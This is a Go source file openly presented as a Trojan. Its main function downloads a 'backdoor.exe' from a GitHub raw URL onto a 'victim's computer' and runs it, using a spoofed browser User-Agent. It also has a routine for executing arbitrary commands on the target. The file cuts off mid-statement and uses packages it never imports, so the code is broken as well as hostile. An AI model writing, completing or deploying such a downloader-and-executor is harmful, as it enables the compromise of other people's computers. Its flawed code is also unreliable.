package main

import (
    "fmt"
    "net/http"
    "os/exec"
    "strings"
)

// Config contains the configuration for the Trojan.
type Config struct {
    // Target is the IP address or hostname of the victim's computer.
    Target string
    // Port is the port on the victim's computer that the Trojan will connect to.
    Port int
    // Commands is a list of commands that the Trojan will execute on the victim's computer.
    Commands []string
}

// NewConfig creates a new Config object.
func NewConfig() Config {
    return Config{
        Target: "",
        Port: 8080,
        Commands: []string{},
    }
}

// Download downloads a file from a URL.
func Download(url string, dest string) error {
    // Create a new HTTP client.
    client := &http.Client{}

    // Create a request to download the file.
    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        return err
    }

    // Set the User-Agent header so that the server doesn't block the request.
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")

    // Send the request and get the response.
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

    // Check if the response was successful.
    if resp.StatusCode != 200 {
        return fmt.Errorf("failed to download file: %d", resp.StatusCode)
    }

    // Create a new file to write the contents of the response to.
    file, err := os.Create(dest)
    if err != nil {
        return err
    }

    // Write the contents of the response to the file.
    defer file.Close()
    io.Copy(file, resp.Body)

    return nil
}

// Run executes a command on the victim's computer.
func Run(command string) error {
    // Create a new process.
    cmd := exec.Command(command)

    // Start the process.
    err := cmd.Start()
    if err != nil {
        return err
    }

    // Wait for the process to finish.
    err = cmd.Wait()
    if err != nil {
        return err
    }

    return nil
}

// Main is the entry point for the Trojan.
func main() {
    // Get the configuration for the Trojan.
    config := NewConfig()

    // Check if the target is valid.
    if config.Target == "" {
        fmt.Println("Error: Target is not set")
        return
    }

    // Check if the port is valid.
    if config.Port < 1 || config.Port > 65535 {
        fmt.Println("Error: Port is not valid")
        return
    }

    // Check if the commands are valid.
    for _, command := range config.Commands {
        if !strings.HasPrefix(command, "/") {
            fmt.Println("Error: Command must start with a slash")
            return
        }
    }

    // Download the Trojan binary to the victim's computer.
    err := Download("https://raw.githubusercontent.com/michenriksen/go-backdoor/master/backdoor.exe", "backdoor.exe")
    if err != nil {
        fmt.Println("Error: Failed to download Trojan binary")
        return
    }

    // Run the Trojan binary on the victim's computer.
    err = Run("backdoor.exe")
    if err != nil {
        fmt.Println("Error: Failed